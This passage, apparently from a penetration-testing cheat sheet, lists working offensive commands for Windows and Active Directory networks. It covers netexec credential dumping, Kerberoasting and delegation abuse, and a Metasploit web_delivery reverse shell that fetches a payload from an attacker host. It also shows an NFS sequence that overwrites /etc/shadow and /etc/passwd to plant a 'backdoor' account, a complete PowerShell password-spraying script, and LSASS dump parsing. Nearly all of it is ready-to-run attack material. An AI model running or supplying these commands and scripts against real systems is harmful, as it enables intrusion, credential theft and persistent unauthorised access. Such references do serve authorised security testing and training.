$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wam --mkfile masterkeys.txt
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wam --pvk domain_backup_key.pvk
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wifi
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M keepass_discover
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M keepass_trigger -o KEEPASS_CONFIG_PATH="<PATH>"
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M veeam
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M winscp
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M putty
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M vnc
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mremoteng
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad++
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M rdcman
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M teams_localdb
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M security-questions
```

#### Timeroasting

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M timeroast
```

#### User Handling

##### Change User Password

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M change-password -o NEWPASS=<PASSWORD>
```

##### Change Password of a different User

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M change-password -o USER=<USERNAME> NEWPASS=<PASSWORD>
```

#### Delegation

##### Resource-Based Constrained Delegation (RBCD)

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --delegate Administrator
```

##### S4U2Self

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -H <HASH> --delegate Administrator --self
```

#### Command Execution

```console
$ netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x <COMMAND>
$ netexec smb <RHOST> -u '<USERNAME>' -M pi -o PID=<PID> EXEC=<COMMAND>
```

#### Reverse Shells

##### Metasploit

```console
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set LHOST <LHOST>
msf6 exploit(multi/script/web_delivery) > set LPORT <LPORT>
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_https
msf6 exploit(multi/script/web_delivery) > set SRVHOST <LHOST>
msf6 exploit(multi/script/web_delivery) > set SRVPORT <LPORT>
msf6 exploit(multi/script/web_delivery) > set target 2
msf6 exploit(multi/script/web_delivery) > run -j
```

```console
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
```

### LDAP

#### Domain Enumeration

```console
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users-export <FILE>
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --active-users
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups "<GROUP>"
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --admin-count
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query "(adminCount=1)" "sAMAccountName"
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dc-list
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M maq
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_trusts
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ldap-checker
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M whoami
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M sccm -o REC_RESOLVE=TRUE
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound --dns-tcp --dns-server <RHOST> -c All
```

#### Find Domain SID

```console
$ netexec ldap <RHOST> -u '<USERNAME>' -k --get-sid
```

#### LDAP Queries

```console
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query "(sAMAccountName=Administrator)" ""
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query "(sAMAccountName=Administrator)" "sAMAccountName objectClass pwdLastSet"
```

#### Domain Access Control List (DACL) Enumeration

```console
$ netexec ldap -k --kdcHost <RHOST> -M daclread -o TARGET=Administrator ACTION=read
$ netexec ldap -k --kdcHost <RHOST> -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=<USERNAME>
$ netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET_DN="DC=<DOMAIN>,DC=<DOMAIN>" ACTION=read RIGHTS=DCSync
$ netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied
$ netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET=../../<FILE> ACTION=backup
```

#### Network Enumeration

```console
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ONLY_HOSTS=true
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
```

#### Credentials Dumping

```console
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
```

#### ASREPRoast

```console
$ netexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.asreproast
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
$ netexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.asreproast --kdcHost <DOMAIN>
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast --kdcHost <DOMAIN>
```

#### Kerberoasting

```console
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
```

#### Delegation

##### Find Delegation

```console
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
```

##### Find Unconstrained Delegation

```console
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --trusted-for-delegation
```

#### Active Directory Certificate Services (AD CS)

#### ESC8: NTLM Relay to AD CS HTTP Endpoints

```console
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs -o SERVER=<RHOST>
```

### WinRM

#### Command Execution

```console
$ netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -X <COMMAND>
```

### MSSQL

#### RID Brute Force

```console
$ netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --rid-brute
```

#### Privilege Escalation

```console
$ netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv
$ netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv -o ACTION=privesc
$ netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv -o ACTION=rollback
```

#### Command Execution

```console
$ netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth -x whoami
$ netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

#### File Handling

```console
$ netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\PATH\\TO\FOLDER\\<FILE> /PATH/TO/FOLDER/<FILE>
$ netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /PATH/TO/FILE/<FILE> \\PATH\\TO\FOLDER\\<FILE>
```

### SSH

#### Command Execution

```console
$ netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x <COMMAND>
```

#### File Handling

```console
$ netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file /PATH/TO/FOLDER/<FILE> <FILE>
$ netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE> /PATH/TO/FOLDER/<FILE>
```

### FTP

#### File Handling

```console
$ netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ls
$ netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file <FILE>
$ netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE> <FILE>
```

### RDP

#### Take Screenshot

```console
$ netexec rdp <RHOST> --nla-screenshot
$ netexec rdp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --screenshot --screentime 3
```

### WMI

#### Command Execution

```console
$ netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x <COMMAND>
```

### NFS

#### Share Enumeration

```console
$ netexec nfs <RHOST>
$ netexec nfs <RHOST> --shares
$ netexec nfs <RHOST> --enum-shares
$ netexec nfs <RHOST> --share '/var/nfs/general' --ls '/'
```

#### File Handling

```console
$ netexec nfs <RHOST> --get-file /PATH/TO/FOLDER/<FILE> <FILE>
$ netexec nfs <RHOST> --put-file <FILE> /PATH/TO/FOLDER/<FILE>
```

#### Escape to root File System

| Username | Password |
| --- | --- |
| backdoor | P@ssword123! |

```console
$ netexec nfs <RHOST> --ls '/'
$ netexec nfs <RHOST> --get-file '/etc/shadow' etc_shadow
$ netexec nfs <RHOST> --get-file '/etc/passwd' etc_passwd
$ echo 'backdoor$6$QF0YMBn9$Gj7DTxYtq7ie3zTOSSHrFsp2DpWqTpV0xunqkGxU7UlK8tZkW6zzFNRy8GwsVqYFxflK0zPbAAKQt6VwAhWqsyO:18000:0:99999:7:::' >> etc_shadow
$ echo 'backdoor:x:1003:1001:,,,:/home/backdoor:/bin/bash' >> etc_passwd
$ netexec nfs <RHOST> --put-file etc_shadow '/etc/shadow'
$ netexec nfs <RHOST> --put-file etc_passwd '/etc/passwd'
$ ssh backdoor@<RHOST>
```

## Patator

> https://github.com/lanjelot/patator

```console
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:mesg='Authentication failed.'
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:fgrep='failed'
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:egrep='failed'
```

## PDFCrack

```console
$ pdfcrack -f file.pdf -w /PATH/TO/WORDLIST/<WORDLIST>
```

## psk-crack

```console
$ psk-crack <FILE> -d /PATH/TO/WORDLIST/<WORDLIST>
```

## pypykatz

> https://github.com/skelsec/pypykatz

### Common Commands

```console
$ pypykatz lsa minidump lsass.dmp
$ pypykatz registry --sam sam system
```

### Create RC4 Hash from Password

```console
$ pypykatz crypto nt 'P@ssw0rd123!'
```

## RsaCtfTool

> https://github.com/Ganapati/RsaCtfTool

```console
$ python3 RsaCtfTool.py --publickey /PATH/TO/<KEY>.pub --uncipherfile /PATH/TO/FILE/<FILE>.enc
```

## Spray-Passwords

### Spray-Passwords.ps1

```powershell
<#
  .SYNOPSIS
    PoC PowerShell script to demo how to perform password spraying attacks against 
     user accounts in Active Directory (AD), aka low and slow online brute force method.
    Only use for good and after written approval from AD owner.
    Requires access to a Windows host on the internal network, which may perform
     queries against the Primary Domain Controller (PDC).
    Does not require admin access, neither in AD or on Windows host.
    Remote Server Administration Tools (RSAT) are not required.
    
    Should NOT be considered OPSEC safe since:
    - a lot of traffic is generated between the host and the Domain Controller(s).
    - failed logon events will be massive on Domain Controller(s).
    - badpwdcount will iterate on user account objects in scope.
    
    No accounts should be locked out by this script alone, but there are no guarantees.
    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.
  .DESCRIPTION
    Perform password spraying attack against user accounts in Active Directory.
  .PARAMETER Pass
    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'. Do not use together with File or Url."
	
  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.
	
  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.
	
  .PARAMETER Admins
    Warning: will also target privileged user accounts (admincount=1.)". Default = $false.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'
    1. Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins
    1. Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose 
    
    1. Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose 
    
    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
    3. Output script progress/status information to console.
  .LINK
    Get latest version here: https://github.com/ZilentJack/Spray-Passwords
  .NOTES
    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com
    Together with  : CyberKeel / www.cyberkeel.com
    Date created   : 09/05-2016
    Last modified  : 26/06-2016
    Version history:
    - 1.00: Initial public release, 26/06-2016
    Tested on:
     - WS 2016 TP5
     - WS 2012 R2
     - Windows 10
    Known Issues & possible solutions/workarounds:
     KI-0001: -
       Solution: -
    Change Requests for vNext (not prioritized):
     CR-0001: Support for Fine-Grained Password Policies (FGPP).
     CR-0002: Find better way of getting Default Domain Password Policy than "NET ACCOUNTS". Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.
     CR-0003: Threated approach to test more user/password combinations simultaneously.
     CR-0004: Exception or include list based on username, group membership, SID's or the like.
     CR-0005: Exclude user account that executes the script (password probably already known).
    Verbose output:
     Use -Verbose to output script progress/status information to console.
#>

[CmdletBinding(DefaultParameterSetName='ByPass')]
Param 
(
    [Parameter(Mandatory = $true, ParameterSetName = 'ByURL',HelpMessage="Download file from given URL and use as password input file to test multiple passwords for each targeted user account.")]
    [String]
    $Url = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByFile',HelpMessage="Supply a path to a password input file to test multiple passwords for each targeted user account.")]
    [String]
    $File = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByPass',HelpMessage="Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'")]
    [AllowEmptyString()]
    [String]
    $Pass = '',

    [Parameter(Mandatory = $false,HelpMessage="Warning: will also target privileged user accounts (admincount=1.)")]
    [Switch]
    $Admins = $false

)

# Method to determine if input is numeric or not
Function isNumeric ($x) {
    $x2 = 0
    $isNum = [System.Int32]::TryParse($x, [ref]$x2)
    Return $isNum
}

# Method to get the lockout threshold - does not take FGPP into acocunt
Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].Split(":")[1].Trim()

    If (isNumeric($threshold) )
        {
            Write-Verbose "threshold is a number = $threshold"
            $threshold = [Int]$threshold
        }
    Else
        {
            Write-Verbose "Threshold is probably 'Never', setting max to 1000..."
            $threshold = [Int]1000
        }
    
    Return $threshold
}

# Method to get the lockout observation window - does not tage FGPP into account
Function Get-Duration
{
    $data = net accounts
    $duration = [Int]$data[7].Split(":")[1].Trim()
    Write-Verbose "Lockout duration is = $duration"
    Return $duration
}

# Method to retrieve the user objects from the PDC
Function Get-UserObjects
{
    # Get domain info for current domain
    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
    Catch {Write-Verbose "No domain found, will quit..." ; Exit}
   
    # Get the DC with the PDC emulator role
    $PDC = ($domainObj.PdcRoleOwner).Name

    # Build the search string from which the users should be found
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName

    # Create a DirectorySearcher to poll the DC
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain

    # Select properties to load, to speed things up a bit
    $Searcher.PropertiesToLoad.Add("samaccountname") > $Null
    $Searcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $Searcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true
    If ($Admins) {$Searcher.filter="(&(samAccountType=805306368)(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    Else {$Searcher.filter="(&(samAccountType=805306368)(!(admincount=1))(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    $Searcher.PageSize = 1000

    # Find & return targeted user accounts
    $userObjs = $Searcher.FindAll()
    Return $userObjs
}

# Method to perform auth test with specific username and password
Function Perform-Authenticate
{
    Param
    ([String]$username,[String]$password)

    # Get current domain with ADSI
    $CurrentDomain = "LDAP://"+([ADSI]"").DistinguishedName

    # Try to authenticate
    Write-Verbose "Trying to authenticate as user '$username' with password '$password'"
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom.Name
    
    # Return true/false
    If ($res -eq $null) {Return $false}
    Else {Return $true}
}

# Validate and parse user supplied url to CSV file of passwords
Function Parse-Url
{
    Param ([String]$url)

    # Download password file from URL
    $data = (New-Object System.Net.WebClient).DownloadString($url)
    $data = $data.Split([environment]::NewLine)

    # Parse passwords file and return results
    If ($data -eq $null -or $data -eq "") {Return $null}
    $passwords = $data.Split(",").Trim()
    Return $passwords
}

# Validate and parse user supplied CSV file of passwords
Function Parse-File
{
   Param ([String]$file)

   If (Test-Path $file)
   {
        $data = Get-Content $file
        
        If ($data -eq $null -or $data -eq "") {Return $null}
        $passwords = $data.Split(",").Trim()
        Return $passwords
   }
   Else {Return $null}
}

# Main function to perform the actual brute force attack
Function BruteForce
{
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   #Setup variables
   $userObj = Get-UserObjects
   Write-Verbose "Found $(($userObj).count) active & unlocked users..."
   
   If ($passwords.Length -gt $threshold)
   {
        $time = ($passwords.Length - $threshold) * $duration
        Write-Host "Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes."
   }

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   #Initialize arrays
   For ($i = 0; $i -lt $userObj.Length; $i += 1)
   {
        $done += $false
        $usersCracked += $false
        $numTry += 0
   }

   # Main while loop which does the actual brute force.
   Write-Host "Performing brute force - press [q] to stop the process and print results..." -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)
   {
        # Get user accounts
        $userObj = Get-UserObjects
        
        # Iterate over every user in AD
        For ($i = 0; $i -lt $userObj.Length; $i += 1)
        {

            # Allow for manual stop of the while loop, while retaining the gathered results
            If ($Host.UI.RawUI.KeyAvailable -and ("q" -eq $Host.UI.RawUI.ReadKey("IncludeKeyUp,NoEcho").Character))
            {
                Write-Host "Stopping bruteforce now...." -Background DarkRed
                Break Main
            }

            If ($usersCracked[$i] -eq $false)
            {
                If ($done[$i] -eq $false)
                {
                    # Put object values into variables
                    $samaccountnname = $userObj[$i].Properties.samaccountname
                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]
                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]
                    
                    # Not yet reached lockout tries
                    If ($badpwdcount -lt ($threshold - 1))
                    {
                        # Try the auth with current password
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                        {
                            Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true
                        }

                        # Auth try did not work, go to next password in list
                        Else
                        {
                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                        }
                    }

                    # One more tries would result in lockout, unless timer has expired, let's see...
                    Else 
                    {
                        $now = Get-Date
                        
                        If ($badpwdtime)
                        {
                            $then = [DateTime]::FromFileTime($badpwdtime)
                            $timediff = ($now - $then).TotalMinutes
                        
                            If ($timediff -gt $duration)
                            {
                                # Since observation window time has passed, another auth try may be performed
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
                            
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }

                            } # Time-diff if

                        }
                        Else
                        {
                            # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
                            Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"
	
	
	
				   # Try the auth with current password
        	                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
			
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }
			 
			 
			    
                        } # Badpwdtime-check if

                    } # Badwpdcount-check if

                } # Done-check if

            } # User-cracked if

        } # User loop

        # Check if the bruteforce is done so the while loop can be terminated
        $amount = 0
        For ($j = 0; $j -lt $done.Length; $j += 1)
        {
            If ($done[$j] -eq $true) {$amount += 1}
        }

        If ($amount -eq $done.Length) {Break}

   # Take a nap for a second
   Start-Sleep -m 1000

   } # Main While loop

   If ($results.Length -gt 0)
   {
       Write-Host "Users guessed are:"
       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host " '$($results[$i])' with password: '$($results[$i + 1])'"}
   }
   Else {Write-Host "No passwords were guessed."}
}

$passwords = $null

If ($Url -ne '')
{
    $passwords = Parse-Url $Url
}
ElseIf($File -ne '')
{
    $passwords = Parse-File $File
}
Else
{
    $passwords = $Pass.Split(",").Trim()   
}

If($passwords -eq $null)
{
    Write-Host "Error in password input, please try again."
    Exit
}

# Get password policy info
$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host "WARNING: also targeting admin accounts." -BackgroundColor DarkRed}

# Call the main function and start the brute force
BruteForce $duration $threshold $passwords
```

### Usage

```cmd
PS C:\> .\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
```

## SprayingToolkit

> https://github.com/byt3bl33d3r/SprayingToolkit

### OWA

```console
$ python3 atomizer.py owa <RHOST> <PASSWORDS> <USERNAMES> -i 0:0:01
```

## VNC Password Recovery

```console
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
>>
```
